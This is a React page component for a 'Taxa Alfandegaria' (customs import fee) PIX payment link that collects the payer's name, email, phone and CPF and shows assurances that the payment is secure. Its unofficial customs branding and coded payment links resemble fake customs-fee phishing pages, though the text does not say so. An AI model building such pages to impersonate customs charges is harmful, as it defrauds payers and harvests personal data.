import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { CheckoutForm } from "@/components/checkout/CheckoutForm";
import { OrderSummary } from "@/components/checkout/OrderSummary";
import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
import { PixPayment } from "@/components/checkout/PixPayment";
import { Loader2 } from "lucide-react";
import logo from "@/assets/logo.png";
import { toast } from "sonner";

interface CustomerData {
  name: string;
  email: string;
  phone: string;
  cpf: string;
}

export default function PaymentLink() {
  const { code } = useParams<{ code: string }>();
  const navigate = useNavigate();
  const [customerData, setCustomerData] = useState<CustomerData | null>(null);
  const [showPhoneModal, setShowPhoneModal] = useState(false);
  const [confirmedPhone, setConfirmedPhone] = useState("");
  const [showPayment, setShowPayment] = useState(false);
  const [totalAmount, setTotalAmount] = useState(0);
  const [loadingLink, setLoadingLink] = useState(true);
  const [linkValid, setLinkValid] = useState(false);

  useEffect(() => {
    if (code) {
      fetchPaymentLink();
    }
  }, [code]);

  const fetchPaymentLink = async () => {
    try {
      setLoadingLink(true);
      
      const { data, error } = await supabase
        .from("payment_links")
        .select("*")
        .eq("code", code)
        .eq("is_active", true)
        .single();

      if (error || !data) {
        toast.error("Link de pagamento inválido ou expirado");
        setTimeout(() => navigate("/"), 2000);
        return;
      }

      setTotalAmount(data.amount);
      setLinkValid(true);

      // Incrementar contador de acessos
      await supabase
        .from("payment_links")
        .update({ access_count: data.access_count + 1 })
        .eq("id", data.id);

    } catch (error) {
      console.error("Erro ao buscar link:", error);
      toast.error("Erro ao carregar link de pagamento");
      setTimeout(() => navigate("/"), 2000);
    } finally {
      setLoadingLink(false);
    }
  };

  const handleCustomerDataFilled = (data: CustomerData) => {
    setCustomerData(data);
    setShowPhoneModal(true);
  };

  const handlePhoneConfirm = (phone: string) => {
    setConfirmedPhone(phone);
    setShowPhoneModal(false);
    setShowPayment(true);
  };

  if (loadingLink) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-blue mx-auto" />
          <p className="text-muted-foreground">Carregando link de pagamento...</p>
        </div>
      </div>
    );
  }

  if (!linkValid) {
    return null; // Will redirect
  }

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto px-4 py-12">
        {/* Header */}
        <div className="flex items-center justify-center mb-12">
          <div className="flex flex-col items-center gap-6">
            <div className="relative">
              <div className="absolute inset-0 bg-yellow/20 blur-2xl rounded-full" />
              <img 
                src={logo} 
                alt="Taxa Alfandegaria" 
                className="h-24 w-auto drop-shadow-2xl relative z-10"
              />
            </div>
            <div className="text-center space-y-2">
              <h1 className="text-4xl md:text-5xl font-bold leading-[1.35] pb-3 bg-gradient-to-r from-navy via-blue to-navy bg-clip-text text-transparent">
                Taxa Alfandegaria
              </h1>
              <p className="text-muted-foreground text-lg">Pagamento de Taxa de Importação</p>
              <div className="inline-flex items-center gap-2 px-4 py-2 bg-blue/10 rounded-full border border-blue/20">
                <span className="text-sm font-medium text-blue">Valor:</span>
                <span className="text-lg font-bold text-navy">R$ {totalAmount.toFixed(2)}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          <div className="space-y-6">
            {!showPayment ? (
              <CheckoutForm onCustomerDataFilled={handleCustomerDataFilled} />
            ) : (
              <PixPayment 
                amount={totalAmount}
                customerName={customerData?.name || "Cliente"}
                customerEmail={customerData?.email || ""}
                customerCpf={customerData?.cpf || ""}
                paymentLinkCode={code}
              />
            )}
          </div>

          <div>
            <OrderSummary amount={totalAmount} />
          </div>
        </div>

        {/* Phone Confirmation Modal */}
        {customerData && (
          <PhoneConfirmModal
            isOpen={showPhoneModal}
            initialPhone={customerData.phone}
            onConfirm={handlePhoneConfirm}
            onCancel={() => setShowPhoneModal(false)}
          />
        )}

        {/* Footer */}
        <div className="mt-16 text-center space-y-4">
          <div className="inline-flex items-center gap-3 px-6 py-3 bg-card/80 backdrop-blur-sm rounded-full border border-blue/20 shadow-md">
            <div className="h-2 w-2 rounded-full bg-blue animate-pulse shadow-blue" />
            <span className="text-sm font-medium text-muted-foreground">
              Pagamento seguro via PIX
            </span>
          </div>
          
          <p className="text-xs text-muted-foreground max-w-2xl mx-auto">
            Seus dados estão protegidos. Este é um ambiente seguro para realizar seu pagamento.
          </p>
        </div>
      </div>
    </div>
  );
}
